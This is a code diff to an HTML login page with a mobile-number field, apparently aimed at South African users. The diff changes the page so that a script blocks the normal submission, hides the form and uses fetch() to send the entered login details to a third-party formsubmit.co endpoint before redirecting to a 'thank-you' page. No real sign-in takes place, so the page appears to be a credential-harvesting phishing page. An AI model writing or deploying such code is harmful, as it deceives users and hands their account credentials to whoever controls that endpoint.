@@ -27,17 +27,8 @@
 
   <div class="container">
     <h2>Login</h2>
-    <form 
-      id="login-form" 
-      action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" 
-      method="POST"
-    > 
-      <!-- Disable Captcha -->
-      <input type="hidden" name="_captcha" value="false">
-
-      <!-- Add Redirect -->
-      <input type="hidden" name="_redirect" value="https://yourwebsite.com/thank-you">
-
+    <form id="login-form"> 
+      <!-- Add Input Fields -->
       <label for="mobile">Mobile Number</label>
       <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
 
@@ -67,15 +58,27 @@
 
   <script>
     document.getElementById('login-form').addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent the default form submission
+
+      // Show the loading message
       const loadingMessage = document.getElementById('loading-message');
       const form = document.getElementById('login-form');
-
-      // Show loading message
       loadingMessage.style.display = 'block';
-
-      // Hide the form
       form.style.display = 'none';
+
+      // Send the form data using fetch
+      const formData = new FormData(e.target);
+      fetch('https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21', {
+        method: 'POST',
+        body: formData
+      }).then(response => {
+        // Redirect to a custom page or show success message
+        window.location.href = 'https://yourwebsite.com/thank-you'; // Replace with your custom page URL
+      }).catch(error => {
+        // Handle errors
+        alert('Something went wrong. Please try again.');
+      });
     });
   </script>
 </body>
-        </html>
+</html>
